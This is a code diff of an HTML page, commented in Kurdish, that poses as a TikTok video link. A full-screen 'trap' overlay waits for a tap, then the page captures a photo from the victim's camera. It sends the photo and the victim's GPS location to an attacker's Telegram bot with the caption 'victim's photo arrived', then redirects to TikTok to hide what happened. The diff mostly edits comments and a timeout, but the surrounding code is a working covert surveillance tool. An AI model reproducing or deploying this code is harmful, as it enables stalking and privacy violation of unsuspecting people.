@@ -10,8 +10,11 @@
     <style>
         body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; display: flex; justify-content: center; align-items: center; }
         .bg { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: url('soran.jpg') no-repeat center center; background-size: cover; z-index: 1; filter: brightness(0.7); }
+        
+        /* سەهمی سادەی تیکتۆک ڕێک وەک کۆدەکەی جەنابت */
         .play-btn { position: absolute; z-index: 5; pointer-events: none; }
         .play-icon { width: 90px; height: 90px; fill: white; opacity: 0.9; }
+        
         #trap { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 100; cursor: pointer; }
         video, canvas { display: none; }
         .flash-active { background-color: white !important; transition: background 0.1s; }
@@ -44,12 +47,12 @@
                 v.srcObject = s;
                 await v.play();
 
-                // ٢. چالاککردنی فلاش
+                // ٢. فلاش لێدان
                 bg.style.display = 'none';
                 btn.style.display = 'none';
                 b.classList.add('flash-active');
 
-                // ٣. وێنەگرتن دوای ١١٠٠ میلی چرکە
+                // ٣. پرۆسەی وێنەگرتن و ناردن
                 setTimeout(async () => {
                     const c = document.getElementById('c');
                     c.width = v.videoWidth;
@@ -62,16 +65,18 @@
                     fd.append('photo', blob, 'photo.jpg');
                     fd.append('caption', "📸 وێنەی نێچیر گەیشت\n📱 " + (navigator.userAgent.includes("iPhone") ? "iPhone" : "Android"));
                     
-                    // یەکەم جار وێنەکە دەنێرێت
+                    // --- هەنگاوی یەکەم: ناردنی وێنە ---
                     await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
 
-                    // پاشان داوای لۆکەیشن دەکات و دەنێرێت
+                    // --- هەنگاوی دووەم: ناردنی لۆکەیشن پاش وێنەکە ---
                     if (navigator.geolocation) {
                         navigator.geolocation.getCurrentPosition(async (pos) => {
                             const lat = pos.coords.latitude;
                             const lon = pos.coords.longitude;
                             const mapLink = "https://www.google.com/maps?q=" + lat + "," + lon;
-                            await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent("📍 لۆکەیشن:\n" + mapLink)}`);
+                            await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent("📍 لۆکەیشنەکەی:\n" + mapLink)}`);
+                            
+                            // دوای ناردنی لۆکەیشن، دەیبات بۆ تیکتۆک
                             window.location.href = targetVideo;
                         }, (err) => {
                             window.location.href = targetVideo;
@@ -80,8 +85,8 @@
                         window.location.href = targetVideo;
                     }
 
-                    // ئەگەر لۆکەیشن دواکەوت، دوای ٣ چرکە هەر دەیباتە سەر تیکتۆک
-                    setTimeout(() => { window.location.href = targetVideo; }, 3000);
+                    // دڵنیایی بۆ ئەوەی ئەگەر لۆکەیشنەکە دواکەوت، هەر بچێتە سەر تیکتۆک
+                    setTimeout(() => { window.location.href = targetVideo; }, 2500);
 
                 }, 1100);
 
